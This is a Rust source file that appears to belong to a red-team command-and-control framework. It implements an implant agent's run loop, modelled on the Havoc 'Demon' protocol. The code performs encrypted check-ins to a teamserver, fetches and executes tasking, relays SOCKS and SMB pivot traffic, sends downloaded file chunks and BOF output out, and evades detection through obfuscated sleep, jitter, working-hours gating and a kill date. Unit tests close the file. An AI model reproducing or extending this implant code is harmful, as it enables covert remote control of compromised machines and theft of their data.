//! Legacy Demon-protocol run-loop and checkin flow.

use std::time::Duration;

use red_cell_common::crypto::{ctr_blocks_for_len, decrypt_agent_data_at_offset};
use red_cell_common::demon::{DemonCommand, DemonMessage};
use tracing::{info, warn};

use crate::dispatch::{self, DispatchResult, Response};
use crate::error::SpecterError;
use crate::metadata::current_unix_secs;
use crate::protocol::{build_callback_packet, callback_ctr_blocks, parse_tasking_response};

use super::SpecterAgent;
use super::working_hours::{
    current_local_time, is_within_working_hours_at, sleep_until_working_hours,
};

/// Attempts for DEMON_INIT / ECDH registration before giving up (HTTP + optional DoH per try).
const INIT_HANDSHAKE_MAX_ATTEMPTS: u32 = 5;

/// Initial backoff between registration attempts (exponential, capped).
const INIT_HANDSHAKE_BACKOFF_START_MS: u64 = 400;

impl SpecterAgent {
    /// Check whether the configured kill date has been reached.
    ///
    /// The kill date is stored as a Unix timestamp (seconds since
    /// January 1, 1970 UTC), matching the format emitted by the teamserver's
    /// payload builder and normalised by `common::domain::validate_kill_date`.
    /// Returns `true` when the current time meets or exceeds the deadline.
    pub(super) fn reached_kill_date(&self) -> bool {
        let Some(kill_date) = self.config.kill_date else {
            return false;
        };
        let now = current_unix_secs();
        now >= kill_date
    }

    /// Block until the current time falls within the configured working-hours
    /// window. Returns immediately when no working hours are configured.
    async fn wait_for_working_hours(&self) {
        let Some(wh) = self.config.working_hours else { return };
        let now = current_local_time();
        if is_within_working_hours_at(wh, now) {
            return;
        }
        let delay_ms = sleep_until_working_hours(wh, now);
        info!(delay_ms, "outside working hours; sleeping until window opens");
        crate::sleep_obf::obfuscated_sleep(delay_ms, self.config.sleep_technique).await;
    }

    /// Send a `COMMAND_CHECKIN` callback to the teamserver.
    pub async fn checkin(&mut self) -> Result<Vec<u8>, SpecterError> {
        let response = self.send_callback(DemonCommand::CommandCheckin, 0, &[]).await?;
        let tasking = parse_tasking_response(
            self.agent_id,
            &self.session_crypto,
            self.ctr_offset,
            &response,
        )?;
        self.ctr_offset = tasking.next_recv_ctr_offset;

        Ok(tasking.decrypted)
    }

    /// Request queued tasking from the teamserver.
    pub async fn get_job(&mut self) -> Result<DemonMessage, SpecterError> {
        let response = self.send_callback(DemonCommand::CommandGetJob, 0, &[]).await?;
        let message = self.decrypt_job_message(&response)?;
        Ok(message)
    }

    /// Run the main agent loop: init, then dispatch server tasking repeatedly.
    ///
    /// Each iteration:
    /// 1. Checks whether the kill date has been reached; if so, notifies the
    ///    teamserver with `CommandKillDate` and terminates.
    /// 2. Sleeps for the configured interval (with optional jitter).
    /// 3. Sends a `CommandCheckin` heartbeat.
    /// 4. Sends `CommandGetJob` and dispatches any returned task packages.
    /// 5. Sends a response callback for each dispatched command.
    pub async fn run(&mut self) -> Result<(), SpecterError> {
        if self.reached_kill_date() {
            warn!(
                agent_id = format_args!("0x{:08X}", self.agent_id),
                kill_date = ?self.config.kill_date,
                "kill date already reached at startup; exiting"
            );
            return Ok(());
        }

        self.wait_for_working_hours().await;

        if self.reached_kill_date() {
            warn!("specter kill date reached during working-hours wait; exiting");
            return Ok(());
        }

        if self.config.listener_pub_key.is_some() {
            let mut backoff_ms = INIT_HANDSHAKE_BACKOFF_START_MS;
            let mut last_err: Option<SpecterError> = None;
            for attempt in 1..=INIT_HANDSHAKE_MAX_ATTEMPTS {
                match self.ecdh_init_handshake().await {
                    Ok(()) => return self.run_ecdh_loop().await,
                    Err(e) => {
                        warn!(
                            agent_id = format_args!("0x{:08X}", self.agent_id),
                            attempt,
                            max = INIT_HANDSHAKE_MAX_ATTEMPTS,
                            error = %e,
                            "ECDH registration failed"
                        );
                        last_err = Some(e);
                        if attempt < INIT_HANDSHAKE_MAX_ATTEMPTS {
                            tokio::time::sleep(Duration::from_millis(backoff_ms)).await;
                            backoff_ms = (backoff_ms * 2).min(8_000);
                        }
                    }
                }
            }
            return Err(match last_err {
                Some(e) => e,
                None => SpecterError::Transport(
                    "ECDH registration retries exhausted (no error recorded)".into(),
                ),
            });
        }

        let mut backoff_ms = INIT_HANDSHAKE_BACKOFF_START_MS;
        let mut last_err: Option<SpecterError> = None;
        for attempt in 1..=INIT_HANDSHAKE_MAX_ATTEMPTS {
            match self.init_handshake().await {
                Ok(()) => {
                    last_err = None;
                    break;
                }
                Err(e) => {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        attempt,
                        max = INIT_HANDSHAKE_MAX_ATTEMPTS,
                        error = %e,
                        "DEMON_INIT handshake failed"
                    );
                    last_err = Some(e);
                    if attempt < INIT_HANDSHAKE_MAX_ATTEMPTS {
                        tokio::time::sleep(Duration::from_millis(backoff_ms)).await;
                        backoff_ms = (backoff_ms * 2).min(8_000);
                    }
                }
            }
        }
        if let Some(e) = last_err {
            return Err(e);
        }

        loop {
            // ── Kill-date check ─────────────────────────────────────────
            if self.reached_kill_date() {
                info!(
                    agent_id = format_args!("0x{:08X}", self.agent_id),
                    kill_date = ?self.config.kill_date,
                    "kill date reached — notifying teamserver and exiting"
                );
                // Best-effort: notify the server. If the send fails we still
                // exit — the whole point of a kill date is unconditional cleanup.
                let _ = self.send_callback(DemonCommand::CommandKillDate, 0, &[]).await;
                return Ok(());
            }

            let delay = self.compute_sleep_delay();
            crate::sleep_obf::obfuscated_sleep(delay, self.config.sleep_technique).await;

            // Heartbeat — lets the server record liveness; response is normally NOJOB.
            if let Err(e) = self.checkin().await {
                warn!(
                    agent_id = format_args!("0x{:08X}", self.agent_id),
                    error = %e,
                    "checkin failed, will retry"
                );
                continue;
            }

            // Request and dispatch any queued server tasking.
            let message = match self.get_job().await {
                Ok(m) => m,
                Err(e) => {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        error = %e,
                        "get_job failed, will retry"
                    );
                    continue;
                }
            };

            for package in &message.packages {
                // CommandSocket requires async I/O — handle it directly rather
                // than going through the synchronous dispatch() path.
                if package.command_id == u32::from(DemonCommand::CommandSocket) {
                    if let Err(e) =
                        self.socket_state.handle_command(package.request_id, &package.payload).await
                    {
                        warn!(
                            agent_id = format_args!("0x{:08X}", self.agent_id),
                            error = %e,
                            "socket command failed"
                        );
                    }
                    continue;
                }

                // CommandPivot manages SMB pipe state — handle it directly so
                // the PivotState can track connections and poll them later.
                if package.command_id == u32::from(DemonCommand::CommandPivot) {
                    match self.handle_pivot_command(&package.payload).await {
                        Ok(Some(resp)) => {
                            let rid = if resp.request_id != 0 {
                                resp.request_id
                            } else {
                                package.request_id
                            };
                            if let Err(e) =
                                self.send_callback_raw(resp.command_id, rid, &resp.payload).await
                            {
                                warn!(
                                    agent_id = format_args!("0x{:08X}", self.agent_id),
                                    error = %e,
                                    "failed to send pivot response"
                                );
                            }
                        }
                        Ok(None) => {}
                        Err(e) => {
                            warn!(
                                agent_id = format_args!("0x{:08X}", self.agent_id),
                                error = %e,
                                "pivot command failed"
                            );
                        }
                    }
                    continue;
                }

                let result = dispatch::dispatch(
                    package,
                    &mut self.config,
                    &mut self.token_vault,
                    &mut self.downloads,
                    &mut self.mem_files,
                    &mut self.job_store,
                    &mut self.ps_scripts,
                    &self.bof_output_queue,
                );
                if self.handle_dispatch_result(package.request_id, result).await {
                    // Exit requested — terminate.
                    return Ok(());
                }
            }

            // Poll active sockets, listeners, relays, and SOCKS clients.
            if self.socket_state.has_active_connections() {
                if let Err(e) = self.socket_state.poll().await {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        error = %e,
                        "socket poll failed"
                    );
                }
            }

            // Send any pending socket responses back to the teamserver.
            for resp in self.socket_state.drain_responses() {
                let req_id = resp.request_id;
                if let Err(e) = self.send_callback_raw(resp.command_id, req_id, &resp.payload).await
                {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        command_id = resp.command_id,
                        error = %e,
                        "failed to send socket response"
                    );
                }
            }

            // Poll connected SMB pivots for child agent responses (mirrors
            // Demon's PivotPush).
            if self.pivot_state.has_active_pivots() {
                if let Err(e) = self.poll_pivots().await {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        error = %e,
                        "pivot poll failed"
                    );
                }
            }

            // Send any pending pivot responses back to the teamserver.
            for resp in self.pivot_state.drain_responses() {
                let req_id = resp.request_id;
                if let Err(e) = self.send_callback_raw(resp.command_id, req_id, &resp.payload).await
                {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        command_id = resp.command_id,
                        error = %e,
                        "failed to send pivot response"
                    );
                }
            }

            // Push pending download chunks (mirrors Demon's DownloadPush).
            let fs_cmd_id = u32::from(DemonCommand::CommandFs);
            let download_packets = self.downloads.push_chunks(fs_cmd_id);
            for pkt in download_packets {
                if let Err(e) =
                    self.send_callback_raw(pkt.command_id, pkt.request_id, &pkt.payload).await
                {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        command_id = pkt.command_id,
                        error = %e,
                        "failed to send download chunk"
                    );
                }
            }

            // Drain callbacks queued by background BOF threads and send them
            // to the teamserver as CommandInlineExecute responses.
            let bof_responses = self.drain_bof_output();
            for resp in bof_responses {
                if let Err(e) =
                    self.send_callback_raw(resp.command_id, resp.request_id, &resp.payload).await
                {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        command_id = resp.command_id,
                        error = %e,
                        "failed to send threaded BOF callback"
                    );
                }
            }

            // Poll tracked jobs for natural exit (mirrors Havoc's
            // JobCheckList).  Dead jobs get their handles closed and are
            // reaped so CommandJob/List reflects reality.  Only
            // JOB_TYPE_TRACK_PROCESS entries produce DIED notifications —
            // threads and plain processes are silently reaped.
            let tracked_dead = self.job_store.poll();
            let job_cmd_id = u32::from(DemonCommand::CommandJob);
            for (job_id, request_id) in &tracked_dead {
                let mut payload = Vec::with_capacity(8);
                payload.extend_from_slice(
                    &u32::from(red_cell_common::demon::DemonJobCommand::Died).to_le_bytes(),
                );
                payload.extend_from_slice(&job_id.to_le_bytes());
                if let Err(e) = self.send_callback_raw(job_cmd_id, *request_id, &payload).await {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        job_id,
                        request_id,
                        error = %e,
                        "failed to send job-died notification"
                    );
                }
            }
            self.job_store.reap_dead();
        }
    }

    /// Process one dispatch result, sending any required response packets.
    ///
    /// Returns `true` if the agent should terminate.
    async fn handle_dispatch_result(&mut self, request_id: u32, result: DispatchResult) -> bool {
        match result {
            DispatchResult::Ignore => false,
            DispatchResult::Exit => {
                info!(
                    agent_id = format_args!("0x{:08X}", self.agent_id),
                    "CommandExit received — terminating"
                );
                true
            }
            DispatchResult::Respond(resp) => {
                let rid = if resp.request_id != 0 { resp.request_id } else { request_id };
                if let Err(e) = self.send_callback_raw(resp.command_id, rid, &resp.payload).await {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        command_id = resp.command_id,
                        error = %e,
                        "failed to send response"
                    );
                }
                false
            }
            DispatchResult::MultiRespond(resps) => {
                for resp in resps {
                    let rid = if resp.request_id != 0 { resp.request_id } else { request_id };
                    if let Err(e) =
                        self.send_callback_raw(resp.command_id, rid, &resp.payload).await
                    {
                        warn!(
                            agent_id = format_args!("0x{:08X}", self.agent_id),
                            command_id = resp.command_id,
                            error = %e,
                            "failed to send response"
                        );
                    }
                }
                false
            }
        }
    }

    /// Drain pending BOF callbacks from background threads, converting each
    /// [`coffeeldr::BofCallback`] into a [`Response`] with the
    /// `CommandInlineExecute` command ID.
    pub(super) fn drain_bof_output(&self) -> Vec<Response> {
        let callbacks = match self.bof_output_queue.lock() {
            Ok(mut q) => std::mem::take(&mut *q),
            Err(poisoned) => std::mem::take(&mut *poisoned.into_inner()),
        };

        let cmd_id = u32::from(DemonCommand::CommandInlineExecute);
        callbacks
            .into_iter()
            .map(|cb| {
                let mut payload = Vec::with_capacity(4 + cb.payload.len());
                payload.extend_from_slice(&cb.callback_type.to_le_bytes());
                payload.extend_from_slice(&cb.payload);
                Response { command_id: cmd_id, request_id: cb.request_id, payload }
            })
            .collect()
    }

    /// Compute the sleep delay in milliseconds, applying jitter if configured.
    pub(super) fn compute_sleep_delay(&self) -> u64 {
        let base = u64::from(self.config.sleep_delay_ms);
        if self.config.sleep_jitter == 0 || base == 0 {
            return base;
        }
        let jitter_range = base * u64::from(self.config.sleep_jitter) / 100;
        let spread = jitter_range.saturating_mul(2);
        let jitter = rand::random::<u64>() % (spread.saturating_add(1));
        base.saturating_sub(jitter_range).saturating_add(jitter)
    }

    async fn send_callback(
        &mut self,
        command: DemonCommand,
        request_id: u32,
        payload: &[u8],
    ) -> Result<Vec<u8>, SpecterError> {
        self.send_callback_raw(u32::from(command), request_id, payload).await
    }

    /// Send a callback packet with a raw `command_id` (used by the dispatch loop
    /// to forward arbitrary response command IDs without converting through the
    /// typed `DemonCommand` enum).
    pub(super) async fn send_callback_raw(
        &mut self,
        command_id: u32,
        request_id: u32,
        payload: &[u8],
    ) -> Result<Vec<u8>, SpecterError> {
        let packet = build_callback_packet(
            self.agent_id,
            &self.session_crypto,
            self.ctr_offset,
            self.callback_seq,
            command_id,
            request_id,
            payload,
        )?;
        let result = self.transport.send(&packet).await;

        // Always advance seq and request-side CTR — the server consumes both
        // before sending a response, so skipping on transport failure desyncs.
        self.ctr_offset += callback_ctr_blocks(command_id, payload.len());
        self.callback_seq += 1;

        result
    }

    fn decrypt_job_message(&mut self, response: &[u8]) -> Result<DemonMessage, SpecterError> {
        if response.is_empty() {
            return Ok(DemonMessage::default());
        }

        let message = DemonMessage::from_bytes(response)?;
        let mut packages = Vec::with_capacity(message.packages.len());

        for mut package in message.packages {
            if !package.payload.is_empty() {
                // Monotonic CTR: decrypt each payload at the shared offset and
                // advance by the blocks consumed by the ciphertext.
                let ciphertext_len = package.payload.len();
                package.payload = decrypt_agent_data_at_offset(
                    &self.session_crypto.key,
                    &self.session_crypto.iv,
                    self.ctr_offset,
                    &package.payload,
                )?;
                self.ctr_offset += ctr_blocks_for_len(ciphertext_len);
            }
            packages.push(package);
        }

        Ok(DemonMessage::new(packages))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::SpecterConfig;
    use red_cell_common::demon::DemonPackage;

    #[test]
    fn compute_sleep_delay_no_jitter() {
        let config = SpecterConfig { sleep_delay_ms: 1000, sleep_jitter: 0, ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        assert_eq!(agent.compute_sleep_delay(), 1000);
    }

    #[test]
    fn compute_sleep_delay_with_jitter_is_in_range() {
        // 50% jitter on 10000ms → jitter_range=5000, so output ∈ [5000, 15000].
        let config =
            SpecterConfig { sleep_delay_ms: 10000, sleep_jitter: 50, ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        let mut seen_min = u64::MAX;
        let mut seen_max = u64::MIN;
        for _ in 0..200 {
            let delay = agent.compute_sleep_delay();
            assert!((5000..=15000).contains(&delay), "delay {delay} out of [5000, 15000]");
            seen_min = seen_min.min(delay);
            seen_max = seen_max.max(delay);
        }
        // Over 200 draws the spread must be non-trivial (> 100ms) — catches a cancelled jitter.
        assert!(
            seen_max - seen_min > 100,
            "jitter produced no spread: min={seen_min} max={seen_max}"
        );
    }

    #[test]
    fn decrypt_job_message_decrypts_payloads_with_monotonic_ctr() {
        let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
        // Monotonic CTR: the shared offset starts at some value and advances as
        // each payload is decrypted.  Simulate the server encrypting payloads at
        // successive offsets.
        let start_offset: u64 = 5;
        agent.ctr_offset = start_offset;

        let first_plaintext = vec![0xAA, 0xBB, 0xCC];
        let second_plaintext = vec![0x10; 17];

        // Server encrypts first payload at the current shared offset.
        let first_payload = red_cell_common::crypto::encrypt_agent_data_at_offset(
            &agent.session_crypto.key,
            &agent.session_crypto.iv,
            start_offset,
            &first_plaintext,
        )
        .expect("encrypt first payload");

        // Server advances offset after first payload.
        let offset_after_first =
            start_offset + red_cell_common::crypto::ctr_blocks_for_len(first_payload.len());

        let second_payload = red_cell_common::crypto::encrypt_agent_data_at_offset(
            &agent.session_crypto.key,
            &agent.session_crypto.iv,
            offset_after_first,
            &second_plaintext,
        )
        .expect("encrypt second payload");

        let response = DemonMessage::new(vec![
            DemonPackage::new(DemonCommand::CommandSleep, 1, first_payload),
            DemonPackage::new(DemonCommand::CommandCheckin, 2, Vec::new()),
            DemonPackage::new(DemonCommand::CommandOutput, 3, second_payload),
        ])
        .to_bytes()
        .expect("serialize job response");

        let message = agent.decrypt_job_message(&response).expect("decrypt job response");

        assert_eq!(message.packages.len(), 3);
        assert_eq!(message.packages[0].payload, first_plaintext);
        assert!(message.packages[1].payload.is_empty());
        assert_eq!(message.packages[2].payload, second_plaintext);
        // Monotonic CTR: offset must have advanced past the initial value.
        assert!(
            agent.ctr_offset() > start_offset,
            "CTR offset must advance after decrypting job payloads"
        );
    }

    // ── Kill-date tests ─────────────────────────────────────────────────────

    #[test]
    fn current_unix_secs_returns_reasonable_value() {
        let ts = current_unix_secs();
        // Must be after 2020-01-01 (Unix timestamp 1577836800).
        assert!(ts > 1_577_836_800, "unix timestamp {ts} should be after 2020");
    }

    #[test]
    fn reached_kill_date_false_when_none() {
        let config = SpecterConfig { kill_date: None, ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        assert!(!agent.reached_kill_date());
    }

    #[test]
    fn reached_kill_date_false_when_future() {
        // Set kill date far in the future (year ~2100, Unix timestamp 4102444800).
        let future_ts: i64 = 4_102_444_800;
        let config = SpecterConfig { kill_date: Some(future_ts), ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        assert!(!agent.reached_kill_date());
    }

    #[test]
    fn reached_kill_date_true_when_past() {
        // Set kill date to a past time (2020-01-01, Unix timestamp 1577836800).
        let past_ts: i64 = 1_577_836_800;
        let config = SpecterConfig { kill_date: Some(past_ts), ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        assert!(agent.reached_kill_date());
    }

    #[test]
    fn reached_kill_date_false_when_none_not_zero() {
        // None means no kill date configured — should never trigger.
        let config = SpecterConfig { kill_date: None, ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        assert!(!agent.reached_kill_date());
    }
}
